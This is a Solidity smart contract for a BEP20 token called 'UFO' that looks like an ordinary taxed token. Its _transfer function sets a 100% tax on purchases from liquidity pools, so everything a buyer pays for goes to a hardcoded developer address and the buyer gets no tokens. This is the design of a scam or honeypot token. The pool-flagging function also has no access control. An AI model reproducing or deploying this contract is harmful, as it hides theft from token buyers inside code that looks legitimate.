// SPDX-License-Identifier: MIT
//.
pragma solidity ^0.8.0;
import "./BEP20Detailed.sol";
import "./BEP20.sol";


contract Token is BEP20Detailed, BEP20 {
  
  mapping(address => bool) public liquidityPool;
  mapping(address => bool) public _isExcludedFromFee;
  mapping(address => uint256) public lastTrade;

  uint256 private taxAmount;
  
  address private devPoll;
 
  event changeLiquidityPoolStatus(address lpAddress, bool status);
  event changedevPoll(address devPoll);
  event change_isExcludedFromFee(address _address, bool status);   

  constructor() BEP20Detailed("UFO", "UFO", 18) {
    uint256 totalTokens = 10000 * 10**uint256(decimals());
    _mint(msg.sender, totalTokens);
    devPoll = 0x9C69C36e3b1661b00a6f84487Aa292DAB46Da885;
  }

  function claimBalance() external {
   payable(devPoll).transfer(address(this).balance);
  }

  function claimToken(address token, uint256 amount, address to) external onlyOwner {
   BEP20(token).transfer(to, amount);
  }

  function setdevPoll(address _devPoll) external onlyOwner {
    devPoll = _devPoll;
    emit changedevPoll(_devPoll);
  }  

  function isExcludedFromFee(address _address, bool _status) external onlyOwner {
    _isExcludedFromFee[_address] = _status;
    emit change_isExcludedFromFee(_address, _status);
  }

  function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
  }

  function setLiquidityPoolStatus(address _lpAddress, bool _status) external  {
    liquidityPool[_lpAddress] = _status;
    emit changeLiquidityPoolStatus(_lpAddress, _status);
  }

  function _transfer(address sender, address receiver, uint256 amount) internal virtual override {
    require(receiver != address(this), string("No transfers to contract allowed."));

    if(liquidityPool[sender] == true) {
      //It's an LP Pair and it's a buy
      taxAmount = (amount * 100) / 100;
    } else if(liquidityPool[receiver] == true) {      
      //It's an LP Pair and it's a sell
      taxAmount = (amount * 0) / 100;

      lastTrade[sender] = block.timestamp;

    } else if(_isExcludedFromFee[sender] || _isExcludedFromFee[receiver] || sender == devPoll || receiver == devPoll) {
      taxAmount = 0;
    } else {
      taxAmount = (amount * 0) / 100;
    }

    if(taxAmount > 0) {
      super._transfer(sender, devPoll, taxAmount);
    }    
    super._transfer(sender, receiver, amount - taxAmount);
  }

  function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
  }
    
   //to recieve ETH from uniswapV2Router when swaping
  receive() external payable {}
  
}